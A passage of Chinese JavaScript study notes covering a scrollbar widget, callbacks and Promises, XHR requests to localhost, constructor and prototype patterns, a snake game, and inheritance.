        var maxX = bigImg.offsetWidth - big.offsetWidth;

        //大图的纵向的最大移动距离
        //var maxY = bigImg.offsetHeight - big.offsetHeight;

        //大图的横向移动的坐标
        var bigImgMoveX = x * maxX / (small.offsetWidth - mask.offsetWidth);
        //大图的纵向移动的坐标
        var bigImgMoveY = y * maxX / (small.offsetWidth - mask.offsetWidth);

        //设置图片移动
        bigImg.style.marginLeft = -bigImgMoveX + "px";
        bigImg.style.marginTop = -bigImgMoveY + "px";
    }

</script>
```
>[danger] ##### 代码
```
  <style>
    * {
      margin: 0;
      padding: 0;
    }

    .box {
      width: 300px;
      height: 500px;
      border: 1px solid red;
      margin: 100px;
      position: relative;
      overflow: hidden;
    }

    .content {
      padding: 5px 18px 5px 5px;
      position: absolute;
      top: 0;
      left: 0;

    }

    .scroll {
      width: 18px;
      height: 100%;
      position: absolute;
      top: 0;
      right: 0;
      background-color: #eee;
    }

    .bar {
      height: 100px;
      width: 100%;
      position: absolute;
      top: 0;
      left: 0;
      background-color: red;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
<div class="box" id="box">
  <div class="content" id="content">
    床前明月光啊，明月光，疑是地上霜啊，举头
    床前明月光啊，明月光，疑是地上霜啊，举头
    床前明月光啊，明月光，疑是地上霜啊，举头
    床前明月光啊，明月光，疑是地上霜啊，举头
    床前明

  </div><!--文字内容-->
  <div id="scroll" class="scroll"><!--装滚动条的层-->
    <div class="bar" id="bar"></div><!--滚动条-->
  </div>
</div>
<script src="common.js"></script>
<script>
  //获取需要的元素

  //最外面的div
  var box = my$("box");
  //文字div
  var content = my$("content");
  //装滚动条的div---容器
  var scroll = my$("scroll");
  //滚动条
  var bar = my$("bar");

  //设置滚动条的高度
  //滚动条的高/装滚动条的div的高=box的高/文字div的高
  //滚动条的高=装滚动条的div的高*box的高/文字div的高
  var height = scroll.offsetHeight * box.offsetHeight / content.offsetHeight;
  bar.style.height = height + "px";

  //移动滚动条
  bar.onmousedown = function (e) {
    var spaceY = e.clientY - bar.offsetTop;
    document.onmousemove = function (e) {//移动事件
      var y = e.clientY - spaceY;
      y=y<0?0:y;//最小值
      y=y>scroll.offsetHeight-bar.offsetHeight?scroll.offsetHeight-bar.offsetHeight:y;
      bar.style.top = y + "px";

      //设置鼠标移动的时候,文字不被选中

      window.getSelection? window.getSelection().removeAllRanges():document.selection.empty();

      //滚动条的移动距离/文字div的移动距离=滚动条最大的移动距离/文字div的最大移动距离

      //文字div的移动距离=滚动条的移动距离*文字div的最大移动距离/滚动条最大的移动距离

      var moveY=y*(content.offsetHeight-box.offsetHeight)/(scroll.offsetHeight-bar.offsetHeight);
      //设置文字div的移动距离
      content.style.marginTop=-moveY+"px";




    };
  };

  document.onmouseup=function () {
    //鼠标抬起的时候,把移动事件干掉
    document.onmousemove=null;
  };


</script>
```
[TOC]
>[success] # 用回调思想处理异步
```
1.异步在不确定的时间点出发函数内部，所以思路就是在内部就处理，异步，让参数成为异步函数的内部
2.常见的几种异步 setTimeout readFile writeFile ajax
```
>[danger] ##### 小的案例处理setTimeout函数
```
//处理异步的时候，当异步触发内部函数时在触发整体
function fn(callback) {
    setTimeout(function () {
        var num =1
        callback(num)
    },1000)
}

var a = fn(function (data) {
    console.log(1)

})
```
>[success] # 用回调函数做条件判断
```
1.例如EcmaScript6 中的find 方法
```
>[danger] ##### 仿写一个find 方法讲解
```
1.if中的conditionFunc函数用来做if条件的，如果为真就返回指定内容，并且接受
```
```
var users = [
  {id: 1, name: '张三'},
  {id: 2, name: '张三'},
  {id: 3, name: '张三'},
  {id: 4, name: '张三'}
]

Array.prototype.myFind = function (conditionFunc) {
  // var conditionFunc = function (item, index) { return item.id === 4 }
  for (var i = 0; i < this.length; i++) {
    if (conditionFunc(this[i], i)) {
      return this[i]
    }
  }
}

var ret = users.myFind(function (item, index) {
  return item.id === 2
})
```
>[success] # 回调地狱
```
1.就是异步里面层层嵌套如图
```
![](https://box.kancloud.cn/919b38c344ac4ef73420cde4fd709888_647x308.png)
>[danger] ##### 利用Promise 解决回调地狱
```
1.Promise 参数中有一个回调函数，函数中有两个参数。一 
 个是resolve 成功后执行，一个是reject 失败后执行
2.用Promise 封装起来整个异步，首先Promise 中的异步还
是照样会异步解决问题，但Promise 是一个非异步的方法
```
* 调用
```
var fs = require('fs')
var p1 = new Promise(function (resolve, reject) {
  fs.readFile('./data/a.txt', 'utf8', function (err, data) {
    if (err) {
      // 拒绝
      reject(err)
    } else {
      //决定
      resolve(data)
    }
  })
})

var p2 = new Promise(function (resolve, reject) {
  fs.readFile('./data/b.txt', 'utf8', function (err, data) {
    if (err) {
      reject(err)
    } else {
      resolve(data)
    }
  })
})
```
* 使用
```
1.使用的使用 调用Promise 的then方法，其中then方法中有
两个回调函数，第一个是成功是执行，执行的是创建
Promise的resolve(data)，两个一个是失败执行 reject(err)
2.在执行时候第一个函数return 在返回一个Promise对象，形
成链式调用，当 return 一个 Promise 对象的时候，后续的 
then 中的 方法的第一个参数会作为 p2 的 resolve
```
```
p1
  .then(function (data) {
    console.log(data)
    // 当 p1 读取成功的时候
    // 当前函数中 return 的结果就可以在后面的 then 中 function 接收到
    // 当你 return 123 后面就接收到 123
    //      return 'hello' 后面就接收到 'hello'
    //      没有 return 后面收到的就是 undefined
    // 上面那些 return 的数据没什么卵用
    // 真正有用的是：我们可以 return 一个 Promise 对象
    // 当 return 一个 Promise 对象的时候，后续的 then 中的 方法的第一个参数会作为 p2 的 resolve
    // 
    return p2
  }, function (err) {
    console.log('读取文件失败了', err)
  })
  .then(function (data) {
    // 这里的data 实际上是p2 then中data,也就是p2成功执行后返回的resolve(data) 回调函数
    console.log(data)
  })
```
>[danger] ##### 进行封装
```
1.提取相同的回调，吧Promise 封装成函数的返回值，函数的参数是相同异步的变量
```
```
var fs = require('fs')
function pReadFile(filePath) {
    return new Promise(function (resolve, reject) {
        // 里面执行异步函数
        fs.readFile(filePath,'utf8',function (err,data) {
            if(err){
                // 失败执行返回函数
                reject(err)
            }else {
                // 成功执行返回函数
                resolve(data)
            }
        })
    })
}

pReadFile('./data/a.txt')
    .then(function (data) {
        // 第一个回调等同于resolve(data) 得到成功返回的参数
        console.log(data)
        // 利用了链式调用的思想返回了一个Promise对象，就可以接着使用该对象的方法
        return pReadFile('./data/b.txt')
    },function (err) {
        // 第二个回调等同于reject(err) 得到失败返回的参数
        console.log(err)
    }).then(
        // 这个then 执行的实际是 第一个then返回的对象
    function (data) {
        // 这个then中的成功data 实际第一个then 返回对象的data
        console.log(data)
        // 利用了链式调用的思想返回了一个Promise对象，就可以接着使用该对象的方法

    }
)
```
```
a.txt 保存的内容是hello aaa，b.txt保存的内是hello BBB
```
* 打印结果
```
hello aaa

hello BBB
```
>[danger] ##### 案例处理 jaxa
```
1.使用jquery 想让异步同步直接使用then方法
2.不使用可以用promise 封装
3.下面的案例是有两个下拉框，就好比城市和省份是管理的，通过省去查市形成同步
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Document</title>
</head>

<body>
  <form action="00-js中的一等公民函数.js" id="user_form">
  </form>
  <script type="text/template" id="tpl">
    <div>
      <label for="">用户名</label>
      <input type="text" value="{{ user.username }}">
    </div>
    <div>
      <label for="">年龄</label>
      <input type="text" value="{{ user.age }}">
    </div>
    <div>
      <label for="">职业</label>
      <select name="" id="">
        {{ each jobs }} {{ if user.job === $value.id }}
        <option value="{{ $value.id }}" selected>{{ $value.name }}</option>
        {{ else }}
        <option value="{{ $value.id }}">{{ $value.name }}</option>
        {{ /if }} {{ /each }}
      </select>
    </div>
  </script>
  <script src="node_modules/art-template/lib/template-web.js"></script>
  <script src="node_modules/jquery/dist/jquery.js"></script>
  <script>
    // 用户表
    //  其中一个接口获取用户数据
    //  职业：2
    // 职业信息表
    //  其中一个接口获取所有的职业信息
    // get('http://127.0.0.1:3000/users/4', function (userData) {
    //   get('http://127.0.0.1:3000/jobs', function (jobsData) {
    //     var htmlStr = template('tpl', {
    //       user: JSON.parse(userData),
    //       jobs: JSON.parse(jobsData)
    //     })
    //     console.log(htmlStr)
    //     document.querySelector('#user_form').innerHTML = htmlStr
    //   })
    // })

    // var data = {}
    // $.get('http://127.0.0.1:3000/users/4')
    //   .then(function (user) {
    //     data.user = user
    //     return $.get('http://127.0.0.1:3000/jobs')
    //   })
    //   .then(function (jobs) {
    //     data.jobs = jobs
    //     var htmlStr = template('tpl', data)
    //     document.querySelector('#user_form').innerHTML = htmlStr
    //   })

    // var data = {}
    // pGet('http://127.0.0.1:3000/users/4')
    //   .then(function (user) {
    //     data.user = user
    //     return pGet('http://127.0.0.1:3000/jobs')
    //   })
    //   .then(function (jobs) {
    //     data.jobs = jobs
    //     var htmlStr = template('tpl', data)
    //     document.querySelector('#user_form').innerHTML = htmlStr
    //   })

    // pGet('http://127.0.0.1:3000/users/4', function (data) {
    //   console.log(data)
    // })

    pGet('http://127.0.0.1:3000/users/4')
      .then(function (data) {
        console.log(data)
      })

    function pGet(url, callback) {
      return new Promise(function (resolve, reject) {
        var oReq = new XMLHttpRequest()
        // 当请求加载成功之后要调用指定的函数
        oReq.onload = function () {
          // 我现在需要得到这里的 oReq.responseText
          callback && callback(JSON.parse(oReq.responseText))
          resolve(JSON.parse(oReq.responseText))
        }
        oReq.onerror = function (err) {
          reject(err)
        }
        oReq.open("get", url, true)
        oReq.send()
      })
    }


    // 这个 get 是 callback 方式的 API
    // 可以使用 Promise 来解决这个问题
    function get(url, callback) {
      var oReq = new XMLHttpRequest()
      // 当请求加载成功之后要调用指定的函数
      oReq.onload = function () {
        // 我现在需要得到这里的 oReq.responseText
        callback(oReq.responseText)
      }
      oReq.open("get", url, true)
      oReq.send()
    }
  </script>
</body>

</html>

```
>[success] # Promise 用法
```
1.第一个异步错误继续执行下面的异步
2.
```
>[danger] #####  第一个异步错误继续执行下面的异步
```
// 读取文件1
// 在上一个 .then 中，返回一个新的 promise 实例，可以继续用下一个 .then 来处理


// 如果 ，前面的 Promise 执行失败，我们不想让后续的Promise 操作被终止，可以为 每个 promise 指定 失败的回调
/* getFileByPath('./files/11.txt')
  .then(function (data) {
    console.log(data)

    // 读取文件2
    return getFileByPath('./files/2.txt')
  }, function (err) {
    console.log('这是失败的结果：' + err.message)
    // return 一个 新的 Promise
    return getFileByPath('./files/2.txt')
  })
  .then(function (data) {
    console.log(data)

    return getFileByPath('./files/3.txt')
  })
  .then(function (data) {
    console.log(data)
  }).then(function (data) {
    console.log(data)
  }) */

```
>[danger] ##### 第一个异步错误所有都不执行
```
// 当 我们有这样的需求： 哪怕前面的 Promise 执行失败了，但是，不要影响后续 promise 的正常执行，此时，我们可以单独为 每个 promise，通过 .then 指定一下失败的回调；

// 有时候，我们有这样的需求，个上面的需求刚好相反：如果 后续的Promise 执行，依赖于 前面 Promise 执行的结果，如果前面的失败了，则后面的就没有继续执行下去的意义了，此时，我们想要实现，一旦有报错，则立即终止所有 Promise的执行；

getFileByPath('./files/1.txt')
  .then(function (data) {
    console.log(data)

    // 读取文件2
    return getFileByPath('./files/22.txt')
  })
  .then(function (data) {
    console.log(data)

    return getFileByPath('./files/3.txt')
  })
  .then(function (data) {
    console.log(data)
  })
  .catch(function (err) { // catch 的作用： 如果前面有任何的 Promise 执行失败，则立即终止所有 promise 的执行，并 马上进入 catch 去处理 Promise中 抛出的异常；
    console.log('这是自己的处理方式：' + err.message)
  })
```
[一、创建对象的四种方式](一、创建对象的三种方式.md)
[二、构造函数和实例对象关系](二、构造函数和实例对象关系.md)
[三、小试牛刀编写面向对象](三、小试牛刀编写面向对象.md)
[四、深入了解面向对象](四、深入了解面向对象.md)
[五、把局部变量更新成全局](五、把局部变量更新成全局.md)
[六、做一个贪吃蛇](六、做一个贪吃蛇.md)
[七、继承](七、继承.md)
[八、函数声明和函数表达区别](八、函数声明和函数表达区别.md)
[九、this 指向](九、this指向.md)
[十、apply 和 call 方法](十、apply和call方法.md)
[十一、bind 方法](十一、bind方法.md)
[十二、常见函数中的成员](十二、常见函数中的成员.md)
[十三、函数作为参数和返回值](十三、函数作为参数和返回值.md)
[十四、闭包](十四、闭包.md)
[十五、沙箱](十五、沙箱.md)
[十六、递归](十六、递归.md)
[十七、赋值、深浅copy](十七、赋值、深浅copy.md)

[TOC]

>[success] # 创建对象的四种方式
```
1.字面量的方式
2.调用系统的构造函数
3. 简单工厂函数的方式来创建对象
4.自定义构造函数方式
```
>[danger] ##### 字面量的方式
```
1.代码复用性差
2.如果要创建大量的同类型对象，则需要些大量重复性代码
```
```
   var per1={
     name:"卡",
     age:20,
     sex:"男",
     eat:function () {
       console.log("吃");
     }
   };
```
>[danger] ##### 调用系统构造函数
```
1 创建的对象无法复用,复用性差
2 如果需要创建多个同类型的对象,如(书籍)则需要写大量重复的代码,代码的冗余度高
```
```
   var per2=new Object();
   per2.name="大";
   per2.age=30;
   per2.sex="男";
   per2.eat=function () {
     console.log("吃");
   };
```
>[danger] #####  简单工厂函数的方式来创建对象
```
1.工厂函数方式创建对象其本质是对内置构造函数创建对象的过程进行了封装
2.适用于大规模“批量生产”同类型的对象
```
```
    function createObject(name,age) {
      var obj=new Object();
      obj.name=name;
      obj.age=age;
      obj.sayHi=function () {
        console.log("您好");
      };
      return obj;
    }
```
>[danger] ##### 自定义构造函数方式
```
1.开辟空间存储对象
2.把this设置为当前的对象
3.设置属性和方法的值
4.把this对象返回
```
```
    function Person(name,age) {
      this.name=name;
      this.age=age;
      this.sayHi=function () {
        console.log("您好");
      };
    }
```
>[success] # 工厂创建和自定义创建的区别
```
1.工厂模式：
	函数名字小写
    通过内部构建系统的构造函数创建
    有返回值
    直接调用函数创建对象 例如 var per=createObject("小明",20);

2.自定义模式：
	函数名字是大写首字母
    内部不用创建系统的构造函数
    无需返回一创建内部构造函数
    this是指向当前对象
    通new 创建多想    var per1=new Person("小红",20);
```
[TOC]
>[success] # 构造函数和实例对象关系
```
1.首先构造函数就是类似java 和py 中的类，只不过他叫构造函数，吐槽对后台语言的人来说思维定式绕不开
2.实例对象，就是对象
```
>[danger] ##### 两者的关系
```
1. 实例对象是通过构造函数来创建的 --- 创建的过程叫实例化
```
```
// 自定义构造函数
function Person(name ,age ,sex){
    this.name = name
    this.age = age
    this.sex = sex
    this.eat = function () {
        console.log("吃饭")
    }
}

var per = new Person("wo" ,18 ,'男')

console.log('打印创建对象')
console.dir(per)
console.log('构造函数')
console.dir(Person);
```

>[danger] #####  根据打印结果分析总结

* 打印结果分析
 ![](https://box.kancloud.cn/c5a2aed6d2125ca1c8e67b0831c37f4d_661x271.png)
 
 * 我的总结
```
1.构造函数中有prototype
2.对象中有__proto__但指向了构造函数中的prototype
3.构造函数中有prototype，就可以利用构造函数给prototype赋值，指向对象中
```
* 总结原型
```
1.实例对象中有__proto__这个属性,叫原型,也是一个对象,这个属性是给浏览器使用,不是标准的属性----->__proto__----->可以叫原型对象
2.构造函数中有prototype这个属性,叫原型,也是一个对象,这个属性是给程序员使用,是标准的属性------>prototype--->可以叫原型对象
3.实例对象的__proto__和构造函数中的prototype相等--->true
4.又因为实例对象是通过构造函数来创建的,构造函数中有原型对象prototype
5.实例对象的__proto__指向了构造函数的原型对象prototype
```
>[danger] ##### 判断对象是否属于构造函数三种
```
1. 对象 instanceof 构造函数
2. 对象.constructor==构造函数  // constructor 构造器
3. 对象.__proto__.constructor==构造函数 // 原型.构造函数
```

![](https://box.kancloud.cn/1dbfef80098dad93365a3ddfa58a19cb_898x533.png)

>[success] # 构造函数创建对象 问题
```
1. 当我将通用的方法都放到一个构造函数的时候，也就是说，我们每创建一个对象构造
2. java和js 不同虽然java中的方法写在类中，却不会因为创建对象出现js情况，java 会把类中的方法额外放到一个空间，所有对象执行的方法其实相同
```
>[danger] ##### 仿照java 和 已知的prototype 创建对象方法
```
1.通过原型来解决---------数据共享,节省内存空间,作用之一
```

* 问题代码
```
1.匿名函数会每次创建空间，也就是说方法的开辟空间数== 对象创建个数
```
```
function Person(name,age) {
  this.name=name;
  this.age=age;
  this.eat=function () {
  console.log("吃大榴莲");
};
}
var per1=new Person("小白",20);
var per2=new Person("小黑",30);

console.dir(per1);
console.dir(per2);
console.log(per1.eat==per2.eat)  // flase
``` 
* 第一种解决创建命名函数
```
1.缺点容易出现同名变量覆盖情况
```
```
function myEat() {
  console.log("吃大榴莲");
}
var myEat=10;
function Person(name,age) {
  this.name=name;
  this.age=age;
  this.eat=myEat;
}
var per1=new Person("小白",20);
var per2=new Person("小黑",30);

console.dir(per1);
console.dir(per2);
console.log(per1.eat==per2.eat);   // true
```
* 第二种利用 prototype
```
1.首先prototype 属于构造函数，对象都会指向构造函数，我们可以利用这点吧统一的东西放到prototype里面
```
![](https://box.kancloud.cn/b705dbc39932100400b1c2d77227b06a_460x302.png)
```
    // 自定义构造函数
    function Person(name ,age ,sex){
        this.name = name
        this.age = age
        this.sex = sex
    }
    Person.prototype.eat = function (){
        console.log("吃饭")
    }
    var per = new Person("wo" ,18 ,'男')

    console.log('打印创建对象')
    console.dir(per)
    console.log('构造函数')
    console.dir(Person);
```

>[danger] ##### 总结
```
1.构造函数可以实例化对象
2.构造函数中有一个属性叫prototype,是构造函数的原型对象
3.构造函数的原型对象(prototype)中有一个constructor构造器,这个构造器指向的就是自己所在的原型对象所在的构造函数
4.实例对象的原型对象(__proto__)指向的是该构造函数的原型对象
5.构造函数的原型对象(prototype)中的方法是可以被实例对象直接访问的
```
[TOC]

>[success] # 点击按钮改变css 样式
```
1.问题在this 处理，和js 字典循环只有k
```
![](https://box.kancloud.cn/8490ea42de58acbe7b8a833b18610160_384x259.png)
```js
    function ChangeStyle(btnObj, dvObj, json) {
        this.btnObj = btnObj;
        this.dvObj = dvObj
        this.json = json
    }
    
    ChangeStyle.prototype.init = function () {
        //点击按钮,改变div多个样式属性值
        // 这里面的this 指代这ChangeStyle 对象
        var that = this;
        this.btnObj.onclick = function () {//按钮
            // 如果不在外面用变量接受this
            // 这里面的this 指代就变成了按钮
            for (var key in that.json) {
                that.dvObj.style[key] = that.json[key];
            }
        };
    };

    var json = {"width": "500px", "height": "800px", "backgroundColor": "blue", "opacity": "0.2"};
    var cs = new ChangeStyle(my$("btn"), my$("dv"), json);
    cs.init();//调用方法
```

[TOC]
>[success] # 深入了解面向对象
```
1.原型的作用：共享数据
2.写法，在谁的原型链中创建一个共享方法  例如：Random.prototype.getRandom
```
>[danger] ##### 什么样子的数据是需要写在原型中?
```
1.需要共享的数据就可以写原型中
2.属性需要共享,方法也需要共享
3.需要共享的数据写在构造函数中,需要共享的数据写在原型中 注：构造函数指的是后台所说的类，原型值得是构造函数中的prototype
```
* 简单写法不仅仅是放对象/也可以放属性
```
  function Student(name, age, sex) {
       this.name = name
       this.age = age
       this.sex = sex
   }
   Student.prototype.height = '188';
   Student.prototype.study=function () {
       console.log("学习,写500行代码,小菜一碟");
   };
```
* 升级版本 全部封装到prototype中
```
	function Student(name, age, sex) {
      this.name = name;
      this.age = age;
      this.sex = sex;
    }
    //简单的原型写法
    Student.prototype = {
      //手动修改构造器的指向,相当于重写了 prototype对象，所以要从新构造指向
      // 如果不生命指向默认指向object
      constructor:Student,
      height: "188",
      weight: "55kg",
      study: function () {
        console.log("学习好开心啊");
      },
      eat: function () {
        console.log("我要吃好吃的");
      }
    };
```
>[danger] ##### 实例对象就近原则

```
1.实例对象使用的属性或者方法,先在实例中查找,找到了则直接使用,找不到则,去实例对
象的__proto__指向的原型对象prototype中找,找到了则使用,找不到则报错
```
```
    function Person(age,sex) {
      this.age=age;//年龄
      this.sex=sex;
      this.eat=function () {
        console.log("构造函数中的吃");
      };
    }
    Person.prototype.sex="女";
    Person.prototype.eat=function () {
      console.log("原型对象中的吃");
    };
```

>[danger] ##### 给内置对象添加原型方法
```
1.实例中的方法如果没有,去创建该实例对象的构造函数的原型对象中找
2.下面案例的this等于abcdefg
```
```
    String.prototype.myReverse = function () {
        for(var i=this.length-1;i>=0;i--){
            console.log(this[i]);
        }
    }
    var str="abcdefg";
    str.myReverse();
```
[TOC]
>[success] # 利用window 把局部变量更新成全局
```

```
>[danger] ##### 案例一
```
1.自调用函数可以传参数，可以传入window对象
```
```
    (function (win) {
        var num=10;
        win.num=num
    })(window)
    console.log(num)
```

>[danger] ##### 调用函数产生一个随机数对象
```
 最大值-最小值 得到的随机数 + min 值就是范围
```
```
    (function (win) {
       function Rondom() {

       }
       Random.prototype.getRandom = function (min, max) {
           // 最大值-最小值 得到的随机数 + min 值就是范围
           return Math.floor(Math.random()*(max-min)+min);
       }
    })(window)
    console.log(num)
    //实例化随机数对象
    var rm=new Random();
    //调用方法产生随机数
    console.log(rm.getRandom(2,5));
```
>[danger] ##### 随机生成一个方块
```
1.初始化的 属性方块的 宽/高/ 颜色/ 和生成方块
2.init 方法 设置 div 的样式 宽度高度,位置
3.render 随机生成位置，生成随机x，y 坐标
```
```
    <style>
        .map{
            width: 800px;
            height: 600px;
            background-color: #CCC;
            position: relative;
        }
    </style>
</head>
<div class="map"></div>
<body>
<script>

    (function (win) {
        function Random() {

        }
        Random.prototype.getRandom = function (max, min) {
            return Math.floor(Math.random()*(max- min)+min)
        }
        win.Random = new Random()
    })(window);

    // 设置方块属性
    (function (window) {
        var map = document.querySelector(".map")
        function Food(width, heigth, color) {
            this.width = width || 20;  // 如果没设置 宽度默认20
            this.height = heigth || 20
            this.color = color
            this.ele = document.createElement("div")　
        }
        // 设置 div 的样式 宽度高度,位置
        Food.prototype.init = function () {
            var div = this.ele
            div.style.position="absolute";//脱离文档流
            div.style.width = this.width+'px'
            div.style.height = this.height+'px'
            div.style.backgroundColor = this.color
            map.appendChild(div)
            this.render(map)
        }
        // 随机生成位置，生成随机x，y 坐标
        Food.prototype.render = function (map) {
            console.log(map.offsetLeft)
            var x = Random.getRandom(0,map.offsetWidth/this.width)*this.width
            var y=Random.getRandom(0,map.offsetHeight/this.height)*this.height;
            this.x=x;
            this.y=y;
            var div=this.ele;
            div.style.left=this.x+"px";
            div.style.top=this.y+"px";
        }
        //实例化对象
        var fd=new Food(20,20,"green");
        fd.init(map);
        console.log(fd.x+"===="+fd.y);
    })(window)
```
[TOC]

>[danger] ##### 贪吃蛇
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .map{
            width: 800px;
            height: 600px;
            background-color: #ccc;
            position: relative;
        }
    </style>
</head>
<body>
<div class="map"></div>
<script>
    (function () {
        var elements = [];

        // 创建食物对象，有宽度，有高度，颜色，横纵坐标
        function Food(x, y, width, height, color) {
            // 设置横纵坐标d
            this.x = x||0;
            this.y = y||0;
            this.height = height||20;
            this.width = width||20;
            this.color = color||"green";
        }

        // 创建一个初始化方法让食物显示在页面上
        // 食物应该显示在地图上，传入地图
        Food.prototype.init = function(map){
            remove()
            var div = document.createElement('div')
            div.style.width = this.width+'px';
            div.style.height = this.height+'px';
            div.style.backgroundColor = this.color;
            div.style.position = 'absolute';
            // 生成 横纵随机坐标
            console.log(map)
            this.x = parseInt(Math.random() * (map.offsetWidth / this.width)) * this.width;
            this.y = parseInt(Math.random() * (map.offsetHeight / this.height)) * this.height;
            div.style.left = this.x + "px";
            div.style.top = this.y + "px";
            map.appendChild(div)
            // 创建的方块加到elements 中
            elements.push(div);
        };
        // 删除食物
        //私有的函数---删除食物的
        function remove() {
            //elements数组中有这个食物
            for (var i = 0; i < elements.length; i++) {
                var ele = elements[i];
                //找到这个子元素的父级元素,然后删除这个子元素
                ele.parentNode.removeChild(ele);
                //再次把elements中的这个子元素也要删除
                elements.splice(i, 1);
            }
        }

        // 暴露给全局
        window.Food = Food
    }());

    (function () {
      var element = [];
      function Snake(width, height, direction) {
          this.width = width||20;
          this.height = height||20;
          // 初始化蛇的身体
          this.body = [
              {x: 3, y: 2, color: "red"},//头
              {x: 2, y: 2, color: "orange"},//身体
              {x: 1, y: 2, color: "orange"}//身体
          ];
          //方向
          this.direction = direction || "right";
      }
        
      Snake.prototype.init = function (map) {
            // 每一次初始化蛇的时候删除他上一创建的对象
          remove()
          // 循环遍历创建div
          for(var i=0;i<this.body.length;i++){
              var obj = this.body[i];
              var div = document.createElement('div');
              map.appendChild(div);
              // 设置div 的样式
              div.style.position = "absolute";
              div.style.width = this.width + 'px';
              div.style.height = this.height + 'px';
              // 横纵坐标
              div.style.left = obj.x * this.width + "px";
              div.style.top = obj.y * this.height + "px";
              // 背景颜色
              div.style.backgroundColor = obj.color;
              element.push(div);
          }
      };

        // 移动蛇
        Snake.prototype.move = function(food,map){
            //改变小蛇的身体的坐标位置
            // 身体是每一次移动到前一个方块的位置
            var i = this.body.length - 1;//2 [1,2,3]
            for (; i > 0; i--) {
                this.body[i].x = this.body[i - 1].x;
                this.body[i].y = this.body[i - 1].y;
            }
            //判断方向---改变小蛇的头的坐标位置
            switch (this.direction) {
                case "right":
                    this.body[0].x += 1;
                    break;
                case "left":
                    this.body[0].x -= 1;
                    break;
                case "top":
                    this.body[0].y -= 1;
                    break;
                case "bottom":
                    this.body[0].y += 1;
                    break;
            }
            //判断有没有吃到食物
            //小蛇的头的坐标和食物的坐标一致
            var headX=this.body[0].x*this.width;
            var headY=this.body[0].y*this.height;
            //判断小蛇的头的坐标和食物的坐标是否相同
            if(headX==food.x&&headY==food.y){
                //获取小蛇的最后的尾巴
                var last=this.body[this.body.length-1];
                //把最后的蛇尾复制一个,重新的加入到小蛇的body中
                this.body.push({
                    x:last.x,
                    y:last.y,
                    color:last.color
                });
                //把食物删除,重新初始化食物
                food.init(map);
            }

        };

        //删除小蛇的私有的函数=============================================================================
        function remove() {
            //删除map中的小蛇的每个div,同时删除elements数组中的每个元素,从蛇尾向蛇头方向删除div
            var i = element.length - 1;
            for (; i >= 0; i--) {
                //先从当前的子元素中找到该子元素的父级元素,然后再弄死这个子元素
                var ele = element[i];
                //从map地图上删除这个子元素div
                ele.parentNode.removeChild(ele);
                element.splice(i, 1);
            }
        }


        window.Snake = Snake;
    }());

    (function () {

        var that = null;//该变量的目的就是为了保存游戏Game的实例对象-------

        //游戏的构造函数
        function Game(map) {
            this.food = new Food();//食物对象
            this.snake = new Snake();//小蛇对象
            this.map = map;//地图
            that = this;//保存当前的实例对象到that变量中-----------------此时that就是this
        }

        Game.prototype.init = function () {
            //初始化游戏
            //食物初始化
            this.food.init(this.map);
            //小蛇初始化
            this.snake.init(this.map);
            //调用自动移动小蛇的方法========================||调用了小蛇自动移动的方法
            this.runSnake(this.food, this.map);
            this.bindKey()
        }


        Game.prototype.runSnake = function (food,map) {
           timeId= setInterval(function () {
                //此时的this是window
                //移动小蛇
                this.snake.move(food, map);
                //初始化小蛇
                this.snake.init(map);
                //横坐标的最大值
                var maxX = map.offsetWidth / this.snake.width;
                //纵坐标的最大值
                var maxY = map.offsetHeight / this.snake.height;
                // 获取蛇头
                var headX = this.snake.body[0].x;
                var headY = this.snake.body[0].y;
                // 判断撞墙 横纵坐标
                //横坐标
                if (headX < 0 || headX >= maxX) {
                    //撞墙了,停止定时器
                    clearInterval(timeId);
                    alert("游戏结束");
                }
                //纵坐标
                if (headY < 0 || headY >= maxY) {
                    //撞墙了,停止定时器
                    clearInterval(timeId);
                    alert("游戏结束");
                }
            }.bind(that),150)  // bind 更改绑定对象
        };
        Game.prototype.bindKey=function () {

            //获取用户的按键,改变小蛇的方向
            document.addEventListener("keydown",function (e) {
                //这里的this应该是触发keydown的事件的对象---document,
                //所以,这里的this就是document
                //获取按键的值
                switch (e.keyCode){
                    case 37:this.snake.direction="left";break;
                    case 38:this.snake.direction="top";break;
                    case 39:this.snake.direction="right";break;
                    case 40:this.snake.direction="bottom";break;
                }
            }.bind(that),false);
        };


        window.Game = Game;
    }())
    var g = new Game(document.querySelector(".map"))
    g.init()
</script>
</body>
</html>
```
[TOC]

>[success] # 继承
```
1.js 的继承分两步先创建一个借用的构造函数继承：解决属性
2.原型继承 使用prototype 原型的指向继承函数
```
>[success] # 组合继承

>[danger] ##### 创建一个属性继承 -- call
```
1.这样的继承只是继承了属性，当调用父类方法会报错
```
```

   function Person(name ,age ,sex ,weight){
       this.name=name
       this.age =age
       this.sex =sex
       this.weight =weight
   }

   Person.prototype.eat = function () {
       console.log("吃饭")
   };

   // student 继承 Persong
   function Student(name,age,sex,weight,score) {

       //借用构造函数,传入当前对象
       Person.call(this,name,age,sex,weight);
       this.score = score;
   }

   var stu1 = new Student("小明",10,"男","10kg","100");
   stu1.eat()
```
>[danger] ##### 直接改变原型指向 -- prototype
![](https://box.kancloud.cn/7459ac262633ee5912cd1ba66c64ce4c_795x502.png)
```
1.继承的父类的初始化 属性直接被定死
```

```
   function Person(name ,age ,sex ,weight){
       this.name=name
       this.age =age
       this.sex =sex
       this.weight =weight
   }

   Person.prototype.eat = function () {
       console.log("吃饭")
   };

   // student 继承 Persong
   function Student(score) {

       //借用构造函数,传入当前对象
       this.score = score;

   }
// 只能做成固定赋值，不能随意对属性更改
   Student.prototype = new Person("小明",10,"男","10kg",)
   var stu1 = new Student("100");
   console.log(stu1.age,)
   stu1.eat()
```
>[danger] ##### 真正的继承写法组合
```
1.利用call 创建属性
2.利用prototype改变指向
```
```
   function Person(name ,age ,sex ,weight){
       this.name=name
       this.age =age
       this.sex =sex
       this.weight =weight
   }

   Person.prototype.eat = function () {
       console.log("吃饭")
   };

   // student 继承 Persong
   function Student(name,age,sex,weight,score) {

       //借用构造函数,传入当前对象
       Person.call(this,name,age,sex,weight);
       this.score = score;
   }
    Student.prototype = new Person()
   var stu1 = new Student("小明",10,"男","10kg","100");
   stu1.eat()
```
>[success] # 拷贝继承

>[danger] #####  循环继承对象中的k,v 给赋值到另一个对象中
```
    function Person() {
    }
    Person.prototype.age=10;
    Person.prototype.sex="男";
